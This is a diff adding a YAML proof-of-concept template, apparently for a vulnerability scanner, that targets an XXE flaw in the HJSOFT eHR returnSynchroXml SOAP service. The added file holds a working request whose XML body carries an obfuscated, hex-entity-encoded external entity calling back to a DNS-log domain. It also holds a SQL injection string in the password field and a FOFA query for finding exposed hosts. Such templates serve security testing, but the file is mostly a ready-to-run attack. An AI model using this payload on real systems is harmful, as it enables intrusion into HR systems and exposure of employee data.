@@ -1,0 +1,25 @@
+id: poc-yaml-hjsoft-ehr-returnsynchroxml-xxe
+info:
+  name: 宏景eHR returnSynchroXml XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 宏景eHR
+  fofa: app="HJSOFT-HCM"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: POST
+  path: /services/HrChangeInfoService
+  headers:
+    Content-Type: application/xml
+  data: "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    \ xmlns:hrc=\"http://www.hjsj.com/HrChangeInfoService\">\n   <soapenv:Header/>\n\
+    \   <soapenv:Body>\n      <hrc:returnSynchroXml>\n         <hrc:strString>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;http://{{.domain}}&#x2f;&#x78;&#x78;&#x65;&#x5f;&#x74;&#x65;&#x73;&#x74;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</hrc:strString>\n\
+    \         <hrc:username>1</hrc:username>\n         <hrc:password>1'or '1'='1</hrc:password>\n\
+    \      </hrc:returnSynchroXml>\n   </soapenv:Body>\n</soapenv:Envelope>"
+  expression: status_code == 200 && contains(body,"接收已同步信息数据更新成功") && contains(body,"returnSynchroXmlResponse")
+    && contains(content_type,"text/xml") && reverse.Verify()
+transport: http
